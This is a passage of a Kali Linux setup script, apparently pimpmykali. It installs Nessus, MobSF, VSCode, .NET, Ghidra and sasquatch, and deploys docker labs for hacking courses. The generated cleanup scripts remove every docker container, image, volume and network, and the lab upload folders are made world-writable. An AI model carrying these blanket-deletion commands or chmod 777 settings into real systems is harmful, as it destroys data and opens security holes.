\"Nessus-[0-9]{1,2}.[0-9]{1}.[0-9]{1}-debian10_amd64.deb\" | grep -m1 -i \".deb\")\n      nessus_amd64=\"https://www.tenable.com/downloads/api/v2/pages/nessus/files/$nessus_amd64_file\"\n     \n      echo -e \"\\n  ${greenplus} Downloading Nessus for $arch\"\n      wget -q $nessus_amd64 -O /tmp/nessus_amd64.deb\n      echo -e \"\\n  ${greenplus} Installing Nessus for $arch\"\n      dpkg -i /tmp/nessus_amd64.deb\n      rm -f /tmp/nessus_amd64.deb\n      echo -e \"\\n  ${greenplus} Enabling nessusd service\"\n      systemctl enable --now nessusd\n      check_nessusd_active\n    elif [ $arch == \"arm64\" ]\n     then\n      nessus_arm64_file=$(curl https://www.tenable.com/downloads/nessus\\?loginAttempted\\=true | grep -o -m1 -E \"Nessus-[0-9]{1,2}.[0-9]{1}.[0-9]{1}-ubuntu[0-9]{1,4}_aarch64.deb\" | grep -m1 -i \".deb\")\n      nessus_arm64=\"https://www.tenable.com/downloads/api/v2/pages/nessus/files/$nessus_arm64_file\"\n      \n      echo -e \"\\n  ${greenplus} Downloading Nessus for $arch\"\n      wget $nessus_arm64 -O /tmp/nessus_arm64.deb\n      echo -e \"\\n  ${greenplus} Installing Nessus for $arch\"\n      dpkg -i /tmp/nessus_arm64.deb\n      rm -f /tmp/nessus_arm64.deb\n      echo -e \"\\n  ${greenplus} Enabling nessusd service\" \n      systemctl enable --now nessusd\n      check_nessusd_active\n    elif [ $arch == \"\" ]\n     then\n      echo -e \"\\n  ${redexclaim} Unable to determine arch type, exiting...\" \n      exit\n    fi\n    }\n\n\nmapt_prereq() {\n    echo -e \"\\n  ${greenplus} Installing Mobile Application Pentester course requirements\"\n    is_installed \"python${pyver}-venv aapt apktool adb apksigner zipalign wkhtmltopdf default-jdk jadx\"\n    is_installed \"docker.io\"\n    fix_dockercompose\n    eval systemctl enable docker --now\n    eval docker pull opensecurity/mobile-security-framework-mobsf:latest\n    echo \"sudo docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\" > /usr/bin/mobsf-docker\n    chmod +x /usr/bin/mobsf-docker \n      # git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF /opt/Mobile-Security-Framework-MobSF\n    echo -e \"${spaces}${greenplus} Createed MobSF startup script to /usr/bin/mobsf-docker\"\n    }\n\n\npbb_create_cleanupsh() { \n    cleanup_script=\"cleanup-pbb-labs.sh\"\n    echo -e \"\\n  ${greenplus} Creating cleanup_peh_labs.sh\" \n    # create cleanup.sh - prompts user for Y or y prompt and provides warning before executing commands\n    echo -e \"#!/bin/bash\" > $cleanup_script\n    echo -e \"\\n\" >> $cleanup_script\n    echo \"cleanup_docker () {\" >> $cleanup_script\n    echo -e \"    sudo docker stop \\$(sudo docker ps -aq)\" >> $cleanup_script\n    echo -e \"    sudo docker rm \\$(sudo docker ps -aq)\" >> $cleanup_script\n    echo -e \"    sudo docker rm \\$(sudo docker images -q)\" >> $cleanup_script \n    echo -e \"    sudo docker volume rm \\$(sudo docker volume ls -q)\" >> $cleanup_script \n    echo -e \"    sudo docker network rm \\$(sudo docker network ls -q)\" >> $cleanup_script\n    echo \"    exit\" >> $cleanup_script\n    echo \"    }\" >> $cleanup_script\n    echo -e \"\\n\" >> $cleanup_script\n    echo \"    echo -e \\\"\\n  Warning! This script is about to remove all docker containers and networks!\\\" \" >> $cleanup_script\n    echo \"    read -n3 -p \\\"  Press Y or y to proceed any other key to exit : \\\" userinput \" >> $cleanup_script\n    echo \"    case \\$userinput in\" >> $cleanup_script\n    echo \"        y|Y) cleanup_docker ;;\" >> $cleanup_script\n    echo \"          *) exit ;;\" >> $cleanup_script\n    echo \"    esac\" >> $cleanup_script\n    chmod +x cleanup-pbb-labs.sh\n\n    # create start-pbb-labs.sh\n    startup_script=\"start-pbb-labs.sh\"\n    echo -e \"\\n  ${greenplus} Creating start-pbb-labs.sh\"\n    echo -e \"#!/bin/bash\" > $startup_script\n    echo -e \"\\n\" >> $startup_script\n    echo -e \"cd ~/pbb/labs/\" >> $startup_script\n    echo -e \"sudo docker-compose down\"  >> $startup_script \n    echo -e \"sudo systemctl stop mysqld\" >> $startup_script \n    echo -e \"sudo docker-compose up -d\" >> $startup_script\n    echo -e \"get_lab_status=\\$(curl --silent http://localhost/init.php | grep -i \\\"connection refused\\\" -c)\" >> $startup_script\n    echo -e \"while [ \\$get_lab_status -ge 1 ]\" >> $startup_script\n    echo -e \"do\" >> $startup_script\n    echo -e \"if [[ \\$get_lab_status -ge 1 ]]\" >> $startup_script\n    echo -e \" then\" >> $startup_script\n    echo -e \"  sleep 1\" >> $startup_script\n    echo -e \"checkagain=\\$(curl --silent http://localhost/init.php | grep -i \\\"connection refused\\\" -c)\" >> $startup_script\n    echo -e \"if [[ \\$checkagain == 0 ]]\" >> $startup_script\n    echo -e \" then\" >> $startup_script\n    echo -e \"  curl --silent http://localhost/init.php > /dev/null\" >> $startup_script\n    echo -e \" echo \\\"Databases reset\\\" \">> $startup_script\n    echo -e \"     exit\" >> $startup_script\n    echo -e \"    else\" >> $startup_script\n    echo -e \"      echo > /dev/null\" >> $startup_script\n    echo -e \"    fi\" >> $startup_script\n    echo -e \" else\" >> $startup_script\n    echo -e \"  exit\" >> $startup_script\n    echo -e \" fi\" >> $startup_script\n    echo -e \" done\" >> $startup_script\n    # through here \n    chmod +x start-pbb-labs.sh\n    }    \n\n\npbb_lab_setup() {\n    echo -e \"\\n  ${greenplus} Installing Practical Bug Bounty course requirements\"\n    is_installed \"docker.io\"\n    fix_dockercompose\n    \n    echo -e \"${spaces}${greenplus} Starting docker service and enabling \" \n    APP=\"docker\"\n    FUNCTYPE=\"start service\"\n    systemctl enable docker --now\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    \n    echo -e \"${spaces}${greenplus} Downloading pbb-labs.zip \" \n    wget https://cdn.fs.teachablecdn.com/iaWfH4NrRp20zLOd3xLr -O /tmp/pbb-labs.zip\n    \n    if [[ $finduser == \"root\" ]]\n      then \n        #lab setup for root\n        echo -e \"${spaces}${greenplus} Making peh directory for bugbounty labs /$finduser/pbb\"\n        mkdir /$finduser/pbb\n      \n        echo -e \"${spaces}${greenplus} Extracting labs to /$finduser/pbb/bugbounty\" \n        unzip -o /tmp/pbb-labs.zip -d /$finduser/pbb\n     \n        echo -e \"${spaces}${greenplus} Setting permissions for /$finduser/pbb/bugbounty/labs/uploads\"\n        chmod 777 /$finduser/pbb/bugbounty/labs/uploads\n\n        echo -e \"${spaces}${greenplus} Starting labs docker in daemon mode\" \n        cd /$finduser/pbb/bugbounty\n        pbb_create_cleanupsh\n\n      if [[ ! -f docker-compose.yml ]]\n        then \n          echo -e \"${spaces}${redexclaim} docker-compose.yml not found in current directory, aborting \"\n          exit_screen\n        else \n          echo -e \"${spaces}${greenplus} docker-compose.yml found, starting labs in daemon mode -d\" \n          eval docker-compose up -d \n          get_lab_status=$(curl --silent http://localhost/init.php | grep -c -i \"connection refused\")\n          echo -e \"${spaces}${greenminus} Waiting for databases to reset...\"\n          while [ $get_lab_status -ge 1 ]\n            do\n            if [[ $get_lab_status -ge 1 ]]\n              then\n                sleep 1\n                checkagain=$(curl --silent http://localhost/init.php | grep -c -i \"connection refused\")\n                if [[ $checkagain == 0 ]]\n                  then\n                    curl --silent http://localhost/init.php > /dev/null\n                    echo -e \"${spaces}${greenplus} Database reset\"\n                    exit\n                  else\n                    echo > /dev/null\n                fi\n              else\n              exit\n            fi\n          done\n          exit_screen \n      fi \n     else \n      # lab setup for regular user \n      echo -e \"${spaces}${greenplus} Making pbb directory for labs /home/$finduser/pbb\"\n      mkdir /home/$finduser/pbb\n\n      echo -e \"${spaces}${greenplus} Extracting labs to /home/$finduser/pbb\"\n      unzip -o /tmp/pbb-labs.zip -d /home/$finduser/pbb\n\n      # check for /home/$finduser/pbb/bugbounty/labs/uploads\n      if [[ -d /home/$finduser/pbb/bugbounty/labs/uploads ]]\n        then\n          echo -e \"${spaces}${greenplus} Setting permissions for /home/$finduser/pbb/labs/uploads\"\n          chmod 777 /home/$finduser/pbb/bugbounty/labs/uploads\n          echo -e \"${spaces}${greenplus} Setting ownership to $finduser:$finduser for /home/$finduser/pbb\"\n          chown -R $finduser:$finduser /home/$finduser/pbb\n       else\n          echo -e \"${spaces}${redexclaim} Unable to find /home/$finduser/pbb/labs/uploads\"\n      fi\n\n      echo -e \"${spaces}${greenplus} Creating cleanup-pbb-labs.sh and start-pbb-labs.sh in /home/$finduser/pbb/bugbounty\" \n      cd /home/$finduser/pbb/bugbounty\n      pbb_create_cleanupsh\n\n      echo -e \"${spaces}${greenplus} Cleaning up temporary files...\" \n      rm /tmp/pbb-labs.zip\n\n      echo -e \"${spaces}${greenplus} Starting labs docker in daemon mode\" \n      cd /home/$finduser/pbb/bugbounty\n      if [[ ! -f docker-compose.yml ]]\n        then \n          echo -e \"${spaces}${redexclaim} docker-compose.yml not found in current directory, aborting \"\n          exit_screen\n       else \n          echo -e \"${spaces}${greenplus} docker-compose.yml found, starting labs in daemon mode \" \n          eval docker-compose up -d \n          get_lab_status=$(curl --silent http://localhost/init.php | grep -c -i \"connection refused\")\n          echo -e \"${spaces}${greenminus} Waiting for databases to reset...\"\n          while [ $get_lab_status -ge 1 ]\n            do\n            if [[ $get_lab_status -ge 1 ]]\n              then\n               sleep 1\n               checkagain=$(curl --silent http://localhost/init.php | grep -c -i \"connection refused\")\n                if [[ $checkagain == 0 ]]\n                  then\n                    curl --silent http://localhost/init.php > /dev/null\n                    echo -e \"${spaces}${greenplus} Database reset\"\n                    exit\n                  else\n                    echo > /dev/null\n                fi\n            else\n              exit\n            fi\n          done\n          exit_screen\n      fi\n    fi\n    }\n\n\ninstall_vscode() {\n    # install vscode from microsoft\n    echo -e \"\\n  ${greenplus} Installing VSCode\"\n\n    is_installed \"wget gpg apt_transport_https\"\n\n    wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > /tmp/packages.microsoft.gpg\n    sudo install -D -o root -g root -m 644 /tmp/packages.microsoft.gpg /etc/apt/keyrings/packages.microsoft.gpg\n    echo \"deb [arch=amd64,arm64,armhf signed-by=/etc/apt/keyrings/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main\" | sudo tee /etc/apt/sources.list.d/vscode.list > /dev/null\n    rm -f /tmp/packages.microsoft.gpg\n    #required-apt-update\n    apt_update\n    is_installed code\n    }\n\n\ninstall_vscode_extensions() {\n    # install commonly used extensions and themes\n    # csharp dev kit, csharp extensions, vscode solutions explorer jupyter polyglot material icon theme\n    echo -e \"\\n  ${greenplus} Installing VSCode Extensions\"\n\n    for vscode_extension_id in ms-dotnettools.csdevkit \\\n    ms-dotnettools.csharp \\\n    kreativ-software.csharpextensions \\\n    fernandoescolar.vscode-solution-explorer \\\n    ms-toolsai.jupyter \\\n    ms-dotnettools.dotnet-interactive-vscode \\\n    PKief.material-icon-theme\n    do \n      echo -e \"${spaces}${greenminus} Uninstalling Extension if exists: $vscode_extension_id\" \n      sudo -u $(logname) code --uninstall-extension $vscode_extension_id >/dev/null 2>&1\n      echo -e \"${spaces}${greenplus} Installing Extension: $vscode_extension_id\\n\" \n      sudo -u $(logname) code --install-extension $vscode_extension_id >/dev/null 2>&1\n    done\n    }\n\n\ninstall_dotnet() {\n    echo -e \"\\n  ${greenplus} Installing Dotnet: $vscode_extension_id \\n\" \n    wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb\n    dpkg -i packages-microsoft-prod.deb\n    rm -f packages-microsoft-prod.deb\n    apt_update\n    is_installed \"ca-certificates libc6 libgcc-s1 libicu72 libicu-dev liblttng-ust1 libssl3 libstdc++6 libunwind8 zlib1g\"\n    is_installed \"dotnet-sdk-8.0 aspnetcore-runtime-8.0 dotnet-runtime-8.0\"\n    }\n\n\ncsharp_course_setup() {\n    # clean variables\n    rc_file=\"\"\n    rc_tempfile=\"\"\n\n    USERSHELL=$(echo ${SHELL} | cut -d \"/\" -f4)\n\n    # check for root or actual user\n    if [[ $finduser == \"root\" ]]; \n          then\n            rc_file=\"/root/.${USERSHELL}rc\"\n          else\n            rc_file=\"/home/$(logname)/.${USERSHELL}rc\"\n    fi\n\n    # install vscode\n    install_vscode\n    # install csharp course extensions\n    install_vscode_extensions\n    # install dotnet \n    install_dotnet\n\n    # add DOTNET_ROOT and PATH's to ~/.zshrc\n    # check for $(logname) if $(logname) == root pathing to ~/.zshrc will change\n    if [[ $(cat $rc_file | grep -i -c \"export DOTNET_ROOT\") -ge 0 ]]; \n    then\n      touch /tmp/${USERSHELL}rc.tmp\n      rc_tempfile=\"/tmp/${USERSHELL}rc.tmp\"\n      dotnet_pattern1=\"export DOTNET_ROOT.*\"\n      dotnet_pattern2=\"export PATH\\=\\$PATH\\:\\$DOTNET_ROOT\\:\\$DOTNET_ROOT/tools.*\"\n      dotnet_pattern3=\"# dotnet path statements\"\n      # check .zshrc for exiting entries, if found, remove them and add specified course material entries\n      cat $rc_file | sed s:\"^${dotnet_pattern1}\":\"\":g | sed s:\"^${dotnet_pattern2}\":\"\":g | sed s:\"^${dotnet_pattern3}\":\"\":g | sed '/[^[:space:]]/,$!d' > $rc_tempfile\n      echo \"\" >> $rc_tempfile\n      echo \"# dotnet path statements\" >> $rc_tempfile\n      echo \"export DOTNET_ROOT=\\$HOME/.dotnet\" >> $rc_tempfile\n      echo \"export PATH=\\$PATH:\\$DOTNET_ROOT:\\$DOTNET_ROOT/tools\" >> $rc_tempfile\n      echo \"\" >> $rc_tempfile\n      cp -f $rc_tempfile $rc_file\n      rm -f $rc_tempfile\n      chown $(logname):$(logname) $rc_file\n      runuser $(logname) $SHELL -c 'subshell=$(echo $SHELL | cut -d \"/\" -f4); source $HOME/.$subshell\"rc\"' \n      echo -e \"\\n  ${greenplus} C# 101 for Hackers setup complete\"\n      echo -e \"${spaces}${greenplus} VSCode Version Installed: $(sudo -u $(logname) code --version | head -n1)\" \n      echo -e \"${spaces}${greenplus} Dotnet Installed: $(dotnet --version)\"\n      echo -e \"${spaces}${greenplus} AspNetCore version: $(dotnet --list-runtimes | sort -n | grep \"AspNetCore\" -m 1 | cut -d \"[\" -f1)\"\n      echo -e \"${spaces}${greenplus} NETCore version: $(dotnet --list-runtimes | sort -n | grep \"NETCore\" -m 1 | cut -d \"[\" -f1)\"\n      echo -e \"${spaces}${greenplus} SDK version: $(dotnet --list-sdks | sort -r | head -n1 | cut -d \"[\" -f1)\"\n      echo -e \"${spaces}${greenplus} Added Dotnet Paths to ${rc_file}\"\n      echo -e \"${spaces}${spaces}export DOTNET_ROOT=\\$HOME/.dotnet\"\n      echo -e \"${spaces}${spaces}export PATH=\\$PATH:\\$DOTNET_ROOT:\\$DOTNET_ROOT/tools\"\n      echo -e \"\\n  ${redexclaim} Please execute the following command:  source ~/.zshrc \"\n    fi\n    }\n\n\nhacking_peh_create_cleanupsh() { \n    cleanup_script=\"cleanup-peh-labs.sh\"\n    # create cleanup.sh - prompts user for a Y or y prompt and provides warning before executing commands\n    echo -e \"#!/bin/bash\" > $cleanup_script\n    echo -e \"\\n\" >> $cleanup_script\n    echo \"cleanup_docker () {\" >> $cleanup_script\n    echo -e \"    sudo docker stop \\$(sudo docker ps -aq)\" >> $cleanup_script\n    echo -e \"    sudo docker rm \\$(sudo docker ps -aq)\" >> $cleanup_script\n    echo -e \"    sudo docker rm \\$(sudo docker images -q)\" >> $cleanup_script \n    echo -e \"    sudo docker volume rm \\$(sudo docker volume ls -q)\" >> $cleanup_script \n    echo -e \"    sudo docker network rm \\$(sudo docker network ls -q)\" >> $cleanup_script\n    echo \"    exit\" >> $cleanup_script\n    echo \"    }\" >> $cleanup_script\n    echo -e \"\\n\" >> $cleanup_script\n    echo \"    echo -e \\\"\\n  Warning! This script is about to remove all docker containers and networks!\\\" \" >> $cleanup_script\n    echo \"    read -n3 -p \\\"  Press Y or y to proceed any other key to exit : \\\" userinput \" >> $cleanup_script\n    echo \"    case \\$userinput in\" >> $cleanup_script\n    echo \"        y|Y) cleanup_docker ;;\" >> $cleanup_script\n    echo \"          *) exit ;;\" >> $cleanup_script\n    echo \"    esac\" >> $cleanup_script\n    chmod +x cleanup-peh-labs.sh\n    echo -e \"${spaces}${greenplus} cleanup-peh-labs.sh created\" \n\n    # create start-peh-labs.sh\n    startup_script=\"start-peh-labs.sh\"\n    echo -e \"#!/bin/bash\" > $startup_script\n    echo -e \"\\n\" >> $startup_script\n    echo -e \"cd ~/peh/labs/\" >> $startup_script\n    echo -e \"sudo docker-compose down\"  >> $startup_script \n    echo -e \"sudo systemctl stop mysqld\" >> $startup_script \n    echo -e \"sudo docker-compose up -d\" >> $startup_script\n    echo -e \"get_lab_status=\\$(curl --silent http://localhost/init.php | grep -i \\\"connection refused\\\" -c)\" >> $startup_script\n    echo -e \"while [ \\$get_lab_status -ge 1 ]\" >> $startup_script\n    echo -e \"do\" >> $startup_script\n    echo -e \"if [[ \\$get_lab_status -ge 1 ]]\" >> $startup_script\n    echo -e \" then\" >> $startup_script\n    echo -e \"  sleep 1\" >> $startup_script\n    echo -e \"checkagain=\\$(curl --silent http://localhost/init.php | grep -i \\\"connection refused\\\" -c)\" >> $startup_script\n    echo -e \"if [[ \\$checkagain == 0 ]]\" >> $startup_script\n    echo -e \" then\" >> $startup_script\n    echo -e \"  curl --silent http://localhost/init.php > /dev/null\" >> $startup_script\n    echo -e \" echo \\\"Databases reset\\\" \">> $startup_script\n    echo -e \"     exit\" >> $startup_script\n    echo -e \"    else\" >> $startup_script\n    echo -e \"      echo > /dev/null\" >> $startup_script\n    echo -e \"    fi\" >> $startup_script\n    echo -e \" else\" >> $startup_script\n    echo -e \"  exit\" >> $startup_script\n    echo -e \" fi\" >> $startup_script\n    echo -e \" done\" >> $startup_script\n    chmod +x start-peh-labs.sh\n    echo -e \"${spaces}${greenplus} start-peh-hacking.sh created\"\n    }\n\n\npeh_weblab_setup() {\n    echo -e \"\\n  ${greenplus} Installing PEH Course Web Lab\"\n    echo -e \"${spaces}${greenplus} Installing docker.io and docker-compose\"\n\n    fix_dockercompose \n    \n    echo -e \"${spaces}${greenplus} Starting docker service and enabling \" \n    APP=\"docker\"\n    FUNCTYPE=\"start service\"\n    systemctl enable docker --now\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    \n    echo -e \"${spaces}${greenplus} Downloading peh-web-labs.tar.gz \" \n    wget https://cdn.fs.teachablecdn.com/NgPnyKOwSfWYuwnX3Lzb -O /tmp/peh-web-labs.tar.gz\n    \n    if [[ $finduser == \"root\" ]]\n      then \n        #lab setup for root\n        echo -e \"${spaces}${greenplus} Making peh directory for labs /$finduser/peh\"\n        mkdir /$finduser/peh\n      \n        echo -e \"${spaces}${greenplus} Extracting labs to /$finduser/peh\" \n        tar xvfz /tmp/peh-web-labs.tar.gz -C /$finduser/peh\n     \n        echo -e \"${spaces}${greenplus} Setting permissions for /$finduser/peh/labs/labs/uploads\"\n        chmod 777 /$finduser/peh/labs/labs/uploads\n\n        echo -e \"${spaces}${greenplus} Setting permissions for /$finduser/peh/labs/capstone/assets\"\n        chmod 777 /$finduser/peh/labs/capstone/assets\n\n        echo -e \"${spaces}${greenplus} Starting labs docker in daemon mode\" \n        cd /$finduser/peh/labs \n        hacking_peh_create_cleanupsh\n\n        if [[ ! -f docker-compose.yml ]]\n          then \n            echo -e \"${spaces}${redexclaim} docker-compose.yml not found in current directory, aborting \"\n            exit_screen\n          else \n            echo -e \"${spaces}${greenplus} docker-compose.yml found, starting labs in daemon mode -d\" \n            eval docker-compose up -d \n            exit_screen \n        fi \n      else \n        # lab setup for regular user \n        echo -e \"${spaces}${greenplus} Making peh directory for labs /home/$finduser/peh\"\n        mkdir /home/$finduser/peh \n      \n        echo -e \"${spaces}${greenplus} Extracting labs to /home/$finduser/peh\" \n        tar xvfz /tmp/peh-web-labs.tar.gz -C /home/$finduser/peh \n     \n        # check for /home/$finduser/peh/labs/labs/uploads\n        if [[ -d /home/$finduser/peh/labs/labs/uploads ]]\n          then \n            echo -e \"${spaces}${greenplus} Setting permissions for /home/$finduser/peh/labs/labs/uploads\"\n            chmod 777 /home/$finduser/peh/labs/labs/uploads\n            echo -e \"${spaces}${greenplus} Setting ownership to $finduser:$finduser for /home/$finduser/peh\"\n            chown -R $finduser:$finduser /home/$finduser/peh \n          else \n            echo -e \"${spaces}${redexclaim} Unable to find /home/$finduser/peh/labs/labs/uploads\"\n        fi \n\n        # check for /home/$finduser/peh/labs/capstones/assets\n        if [[ -d /home/$finduser/peh/labs/capstone/assets ]] \n          then \n            echo -e \"${spaces}${greenplus} Setting permissions for /home/$finduser/peh/labs/capstone/assets\"\n            chmod 777 /home/$finduser/peh/labs/capstone/assets\n          else\n            echo -e \"${spaces}${redexclaim} Unable to locate /home/$finduser/peh/labs/capstone/assets\"\n            exit_screen\n        fi \n\n        echo -e \"${spaces}${greenplus} Creating cleanup-peh-labs.sh and start-peh-labs.sh in /home/$finduser/peh/labs\" \n        cd /home/$finduser/peh/labs \n        hacking_peh_create_cleanupsh\n\n        rm -f /tmp/peh-web-labs.tar.gz \n\n        if [[ ! -f docker-compose.yml ]]\n          then \n            echo -e \"${spaces}${redexclaim} docker-compose.yml not found in current directory, aborting \"\n            exit_screen\n          else \n            echo -e \"${spaces}${greenplus} docker-compose.yml found, starting labs in daemon mode \" \n            eval docker-compose up -d \n        fi \n      fi \n    }\n\n\nfix_ghidra() {\n    is_installed \"jq curl\"\n    LATEST_URL=\"https://api.github.com/repos/NationalSecurityAgency/ghidra/releases/latest\"\n    JSON_DATA=$(curl -s \"${LATEST_URL}\")\n    DOWNLOAD_URL=$(echo \"$JSON_DATA\" | jq -r '.assets[] | select(.name | test(\"ghidra_[0-9]+\\\\.[0-9]+\\\\.[0-9]+_PUBLIC_[0-9]{8}\\\\.zip\")) | .browser_download_url')\n\n    GHIDRA_INSTALL_DIR=\"/opt/ghidra\"\n    GHIDRA_TMP_ZIP=\"/tmp/ghidra.zip\"\n    GHIDRA_TMP_DIR=$(mktemp -d)\n    GHIDRA_SYMLINK=\"/usr/local/bin/ghidra\"\n    DESKTOP_FILE=\"/usr/share/applications/ghidra.desktop\"\n    EXEC_PATH=\"${GHIDRA_INSTALL_DIR}/ghidraRun\"\n    ICON_PATH=\"${GHIDRA_INSTALL_DIR}/docs/images/GHIDRA_1.png\"\n    DARK_THEME_URL=\"https://github.com/zackelia/ghidra-dark-theme\"\n\n    echo -e \"\\n  ${greenplus} Ghidra Setup \"\n    \n    # check for current ghidra installation, uninstall if found\n    is_installed_remove \"ghidra ghidra-data\"\n    \n    # install dependencies \n    is_installed \"openjdk-23-jdk\"\n    \n    [ -f ${GHIDRA_TMP_ZIP} ] && rm -f ${GHIDRA_TMP_ZIP}\n\n    [ -d ${GHIDRA_INSTALL_DIR} ] && rm -rf ${GHIDRA_INSTALL_DIR}\n    [ ! -d ${GHIDRA_INSTALL_DIR} ] && mkdir ${GHIDRA_INSTALL_DIR}\n\n    echo -e \"${spaces}${greenplus} Downloading Ghidra\"\n    wget -q \"${WGET_STATUS} \" \"${DOWNLOAD_URL}\" -O \"${GHIDRA_TMP_ZIP}\"\n    \n    echo -e \"${spaces}${greenplus} Unzipping Ghidra to ${GHIDRA_TMP_DIR}\"\n    unzip -qq -o \"${GHIDRA_TMP_ZIP}\" -d \"${GHIDRA_TMP_DIR}\"\n\n    echo -e \"${spaces}${greenplus} Moving Ghidra from ${GHIDRA_TMP_DIR} to ${GHIDRA_INSTALL_DIR}\"\n    mv \"${GHIDRA_TMP_DIR}\"/ghidra_*/* \"${GHIDRA_INSTALL_DIR}\"\n\n    # create symbolic link in $PATH\n    echo -e \"${spaces}${greenplus} Creating Ghidra Symlink ${GHIDRA_SYMLINK}\"\n    [ -f \"${GHIDRA_INSTALL_DIR}\"/ghidraRun ] && ln -sf \"${GHIDRA_INSTALL_DIR}\"/ghidraRun \"${GHIDRA_SYMLINK}\"\n    chmod +x /usr/local/bin/ghidra\n\n    # create .desktop file\n    echo -e \"${spaces}${greenplus} Creating .desktop file ${DESKTOP_FILE}\"\n\n    # .desktop file /usr/share/applications/ghidra.desktop\n    echo -e \"[Desktop Entry]\" > ${DESKTOP_FILE}\n    echo -e \"Version=1.0\" >> ${DESKTOP_FILE}\n    echo -e \"Name=Ghidra\" >> ${DESKTOP_FILE}\n    echo -e \"Comment=Open-source reverse engineering tool\" >> ${DESKTOP_FILE}\n    echo -e \"Exec=${EXEC_PATH}\" >> ${DESKTOP_FILE}\n    echo -e \"Icon=${ICON_PATH}\" >> ${DESKTOP_FILE}\n    echo -e \"Terminal=false\" >> ${DESKTOP_FILE}\n    echo -e \"Type=Application\" >> ${DESKTOP_FILE}\n    echo -e \"Categories=Development;ReverseEngineering;\" >> ${DESKTOP_FILE}\n\n    chmod +x \"$DESKTOP_FILE\"\n\n    echo -e \"${spaces}${greenplus} Ghidra added to the XFCE menu.\"\n\n    # Ghidra Dark Theme (optional quality of life improvement)\n    GHIDRA_DARK_THEME_INSTALL_DIR=\"/opt/ghidra-dark-theme\"\n    [ -d ${GHIDRA_DARK_THEME_INSTALL_DIR} ] && rm -rf ${GHIDRA_DARK_THEME_INSTALL_DIR}\n\n    echo -e \"${spaces}${greenplus} Cloning Ghidra Dark Theme ${DARK_THEME_URL}\"\n    echo -e \"\\n            To install the dark theme, Open Ghidra and Click Edit/Themes/Import\"\n    echo -e \"            browse to ${GHIDRA_DARK_THEME_INSTALL_DIR} double click on the .theme file\\n\"\n  \n    # clone ghidra dark-theme\n    git clone ${DARK_THEME_URL} ${GHIDRA_DARK_THEME_INSTALL_DIR} > /dev/null 2>&1 \n  \n    # Cleanup\n    echo -e \"${spaces}${greenplus} Cleaning up ${GHIDRA_TMP_ZIP}\"\n    rm -f ${GHIDRA_TMP_ZIP}\n    echo -e \"${spaces}${greenplus} Cleaning up ${GHIDRA_TMP_DIR}\"\n    rm -rf ${GHIDRA_TMP_DIR}\n\n    echo -e \"${spaces}${greenplus} Ghidra Setup Complete\"\n    }\n\n\niot_course_setup() {\n    SASQUATCH_URL=\"https://github.com/devttys0/sasquatch\"\n    SASQUATCH_PATCH_URL=\"https://github.com/devttys0/sasquatch/files/7776843/M1-Kali.patch.txt\"\n    CLONE_DIR=\"/opt/sasquatch\"\n    PATCH_DIR=\"/opt/sasquatch/patches\"\n    PATCH_FILE=\"M1-Kali.patch.txt\"\n    INSTALLED_BIN=\"/usr/local/bin/sasquatch\"\n \n    # rev 1.8.1a IoT Course setup requirements\n    echo -e \"\\n  ${greenplus} IoT and Hardware Hacking Course Setup\"\n\n    echo -e \"\\n${spaces}${greenplus} Installing dependencies sigrok xxd zlib1g-dev liblzma-dev liblzo2-dev\"\n    \n    is_installed \"build-essential sigrok xxd zlib1g-dev liblzma-dev liblzo2-dev linux-headers-$(uname -r)\"\n\n    echo -e \"\\n  ${greenplus} Sasquatch Setup\"    \n\n    # remove clone dir if it already exists\n    [ -d ${CLONE_DIR} ] && rm -rf ${CLONE_DIR}\n\n    # remove installed sasquatch binary if it exists \n    [ -f ${INSTALLED_BIN} ] && rm -f ${INSTALLED_BIN}\n\n    echo -e \"\\n${spaces}${greenplus} Cloning sasquatch to ${CLONE_DIR} \\n\"\n    cd /opt && git clone ${SASQUATCH_URL}\n    \n    echo -e \"\\n${spaces}${greenplus} Downloading sasquatch patch ${PATCH_FILE}\"\n    wget -qq ${SASQUATCH_PATCH_URL} -O ${PATCH_DIR}/${PATCH_FILE}\n\n    echo -e \"\\n${spaces}${greenplus} Patching sasquatch with ${PATCH_FILE}\" \n    cd ${PATCH_DIR}\n    patch patch0.txt M1-Kali.patch.txt  > /dev/null 2>&1 \n    APP=\"sasquatch\"\n    FUNCTYPE=\"patch\"\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    clean_vars\n\n    echo -e \"\\n${spaces}${greenplus} Building and installing sasquatch to ${INSTALLED_BIN}\"\n    [ -f ${CLONE_DIR}/build.sh ] && chmod +x ${CLONE_DIR}/build.sh\n    cd ${CLONE_DIR}\n    yes | ./build.sh  # > /dev/null 2>&1\n    APP=\"sasquatch\"\n    FUNCTYPE=\"build\"\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    clean_vars\n\n    fix_ghidra\n\n    echo -e \"${spaces}${greenplus} IoT Course Setup Complete\"\n    }\n\n\n#---- begin pimpmykali-mirrors rev 1.3.2 08.20.2021\nget_mirrorlist() {\n    cleanup\n    fix_sources\n    echo -e \"\\n  ${greenplus} Pimpmykali-Mirrors - kali repo mirror speedtest\"\n\n    mod_deb=$(cat /etc/apt/sources.list | grep -c \"deb http\\:\\/\\/.* kali\\-rolling.*\")\n    mod_debsrc=$(cat /etc/apt/sources.list | grep -c \"deb-src http\\:\\/\\/.* kali\\-rolling.*\")\n\n    if [[ $mod_deb = 1 ]]\n      then\n        echo -e \"${spaces}${greenplus} deb http://*/kali found in /etc/apt/sources.list\"\n      else\n        echo -e \"${spaces}${redexclaim} Unable to find deb http://*/kali in /etc/apt/sources.list\"\n        exit_screen\n    fi\n\n    if [[ $mod_debsrc = 1 ]]\n      then\n        echo -e \"${spaces}${greenplus} deb-src http://*/kali found in /etc/apt/sources.list\"\n      else\n        echo -e \"${spaces}${redexclaim} Unable to find deb-src in /etc/apt/sources.list\"\n        exit_screen\n    fi\n\n    curl -s http://http.kali.org/README?mirrorlist | grep -i \"README\" | cut -d \">\" -f2 | cut -d \"\\\"\" -f2 | grep -i \"http://\" | 